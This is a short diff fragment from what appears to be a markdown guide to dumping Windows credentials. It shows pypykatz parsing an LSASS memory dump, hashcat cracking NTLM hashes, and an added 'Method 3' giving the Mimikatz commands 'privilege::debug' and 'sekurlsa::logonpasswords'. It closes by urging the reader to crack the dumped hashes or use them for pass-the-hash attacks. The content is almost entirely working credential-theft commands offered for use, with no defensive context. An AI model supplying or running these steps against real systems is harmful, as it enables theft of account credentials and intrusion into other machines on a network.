@@ -46,3 +46,13 @@ pypykatz lsa minidump <LSASS savefile path>
 sudo hashcat -m 1000 <LSASS hash file> <wordlist path>
 ```
 
+### METHOD 3 : Mimikatz
+
+- open `mimikatz.exe`
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+- after hashes are dumped, copy them somewhere and start cracking it or use it for pass the hash attacks.
